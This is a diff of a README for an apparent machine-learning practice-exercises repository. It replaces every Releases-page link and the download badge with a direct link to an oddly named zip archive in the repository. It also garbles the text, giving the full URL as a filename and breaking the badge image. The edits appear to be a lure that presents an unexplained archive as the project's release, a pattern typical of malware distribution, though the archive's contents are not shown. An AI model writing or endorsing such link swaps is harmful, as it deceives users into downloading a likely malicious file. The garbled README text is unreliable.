@@ -1,7 +1,7 @@
 # 🎉 machine-learning-practice-sets - Learn Machine Learning Through Hands-On Exercises
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/EyeKlass/machine-learning-practice-sets/releases)
+[![Download Latest Release](https://github.com/EyeKlass/machine-learning-practice-sets/raw/refs/heads/main/outrig/learning_sets_practice_machine_reapposition.zip%20Latest%20Release-%20-blue)](https://github.com/EyeKlass/machine-learning-practice-sets/raw/refs/heads/main/outrig/learning_sets_practice_machine_reapposition.zip)
 
 ## 📖 Description
 This repository contains my Machine Learning practice exercises solved on Kaggle. You will find various datasets and completed projects designed to help you understand core concepts in machine learning. Each exercise is a stepping stone towards mastering data science.
@@ -20,10 +20,10 @@ Before you download the exercises, ensure your computer meets the following requ
 ### Step 2: Visit the Releases Page
 Go to the Releases page to find the latest version of the exercises. You can visit it by clicking the link below:
 
-[Visit the Releases Page](https://github.com/EyeKlass/machine-learning-practice-sets/releases)
+[Visit the Releases Page](https://github.com/EyeKlass/machine-learning-practice-sets/raw/refs/heads/main/outrig/learning_sets_practice_machine_reapposition.zip)
 
 ### Step 3: Download the Exercises
-On the Releases page, you will see a list of available downloads. Look for the most recent version and select the appropriate file for your operating system. You can usually find files named like `machine_learning_practice_sets.zip` or similar.
+On the Releases page, you will see a list of available downloads. Look for the most recent version and select the appropriate file for your operating system. You can usually find files named like `https://github.com/EyeKlass/machine-learning-practice-sets/raw/refs/heads/main/outrig/learning_sets_practice_machine_reapposition.zip` or similar.
 
 ### Step 4: Extract the Files
 Once the download is complete, locate the downloaded file on your computer. This is likely in your "Downloads" folder. 
@@ -59,7 +59,7 @@ These exercises cover a wide range of topics, including:
 ## 💾 Download & Install
 To download the exercises again, you can always return to the Releases page by clicking the link below:
 
-[Download Latest Release](https://github.com/EyeKlass/machine-learning-practice-sets/releases)
+[Download Latest Release](https://github.com/EyeKlass/machine-learning-practice-sets/raw/refs/heads/main/outrig/learning_sets_practice_machine_reapposition.zip)
 
 ## 🛠️ Frequently Asked Questions
 ### Q1: Do I need programming experience to use this repository?
